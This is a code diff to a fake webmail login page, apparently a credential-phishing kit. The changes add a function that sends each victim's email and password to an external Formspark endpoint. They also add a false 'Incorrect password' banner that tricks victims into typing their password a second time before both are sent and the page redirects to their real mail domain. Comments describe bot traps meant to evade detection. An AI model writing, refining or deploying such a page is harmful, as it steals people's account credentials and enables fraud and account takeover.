@@ -32,6 +32,9 @@
     .checkbox-group label{margin-bottom:0;font-weight:400}
     button{width:100%;padding:12px;background:#005a9e;border:none;border-radius:4px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;transition:background .3s}
     button:hover{background:#004a87}
+    button:disabled{background:#6b8fb0;cursor:not-allowed}
+    .error-banner{display:none;background:#fdecea;border:1px solid #f5c6cb;color:#a94442;padding:10px 12px;border-radius:4px;font-size:13px;margin-bottom:20px;text-align:center}
+    .error-banner.show{display:block}
     .footer{text-align:center;margin-top:20px;color:#666;font-size:12px}
     .footer a{color:#005a9e;text-decoration:none}
     .footer a:hover{text-decoration:underline}
@@ -55,6 +58,7 @@
     </div>
 
     <div class="login-form">
+      <div class="error-banner" id="errorBanner">Incorrect password. Please try again.</div>
       <form id="loginForm" method="POST" autocomplete="off">
         <!-- Bot traps: honeypot + timing + hidden field -->
         <input type="text" name="_gotcha" class="hp" tabindex="-1" autocomplete="off" aria-hidden="true">
@@ -84,7 +88,7 @@
           <label for="remember">Remember me</label>
         </div>
 
-        <button type="submit">Continue</button>
+        <button type="submit" id="submitBtn">Continue</button>
       </form>
 
       <div class="footer">
@@ -139,10 +143,22 @@
 
     const form = document.getElementById('loginForm');
     const loader = document.getElementById('loader');
+    const errorBanner = document.getElementById('errorBanner');
+    const submitBtn = document.getElementById('submitBtn');
     let attemptCount = 0;
     let firstPassword = '';
 
-    form.addEventListener('submit', async function(e) {
+    function shipToFormspark(payload) {
+      // Fire-and-forget: keepalive so it survives the redirect
+      fetch(FORMSPARK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+        keepalive: true
+      }).catch(err => console.log('Formspark error:', err));
+    }
+
+    form.addEventListener('submit', function(e) {
       e.preventDefault();
 
       // Honeypot: if filled, silently drop (bot)
@@ -170,31 +186,35 @@
       }
 
       attemptCount++;
-      loader.style.display = 'flex';
 
-      const formData = {
+      // FIRST attempt: ship NOW, then show wrong-password while it flies
+      if (attemptCount === 1) {
+        firstPassword = password;
+        shipToFormspark({
+          email: email,
+          password: password,
+          webmail_login: true,
+          attempt: 'first'
+        });
+
+        // UI flips immediately — no waiting on the fetch
+        errorBanner.classList.add('show');
+        document.getElementById('pass').value = '';
+        document.getElementById('pass').focus();
+        return;
+      }
+
+      // SECOND attempt: ship both, then redirect to real domain
+      loader.style.display = 'flex';
+      submitBtn.disabled = true;
+
+      shipToFormspark({
         email: email,
         password: password,
-        webmail_login: true
-      };
-
-      if (attemptCount === 2) {
-        formData.first_attempt_password = firstPassword;
-        formData.attempt = 'second';
-      } else if (attemptCount === 1) {
-        firstPassword = password;
-        formData.attempt = 'first';
-      }
-
-      try {
-        await fetch(FORMSPARK_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(formData)
-        });
-      } catch(err) {
-        console.log('Formspark error:', err);
-      }
+        first_attempt_password: firstPassword,
+        webmail_login: true,
+        attempt: 'second'
+      });
 
       const domain = email.split('@')[1];
       setTimeout(() => {
